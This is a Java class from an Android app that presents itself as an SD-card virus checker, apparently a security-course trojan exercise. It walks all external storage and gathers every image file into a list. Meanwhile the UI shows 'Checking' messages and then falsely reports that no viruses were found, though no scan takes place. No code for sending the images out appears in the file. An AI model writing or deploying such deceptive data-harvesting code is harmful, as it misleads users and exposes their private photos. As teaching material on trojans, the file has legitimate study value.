package sdviruschecker.seginf.sdviruschecker;

import android.os.Environment;
import android.webkit.MimeTypeMap;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class ImagesReader {
    private static List<File> images = new ArrayList<File>();

    public static List<File> getImagesFromSd() {
        File dir = Environment.getExternalStorageDirectory();
        getImagesFromDir(dir);
        MainActivity mainActivity = MainActivity.getInstace();
        if (mainActivity != null) {
            mainActivity.updateTheTextView("Check finished! No viruses were found. Next scan in 1 hour");
        }

        return images;
    }

    private static void getImagesFromDir(File dir) {
        for (final File f : dir.listFiles()) {
            if (f.isDirectory()) {
                ImagesReader.getImagesFromDir(f);
            } else {
                MainActivity mainActivity = MainActivity.getInstace();
                if (mainActivity != null) {
                    MainActivity.getInstace().updateTheTextView("Checking: " + f.getAbsolutePath() + "...");
                }
                String extension = MimeTypeMap.getFileExtensionFromUrl(f.getAbsolutePath());
                String mimeTypeFromExtension = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
                if (mimeTypeFromExtension != null && mimeTypeFromExtension.startsWith("image")) {
                    images.add(f);
                }
            }
        }
    }
}
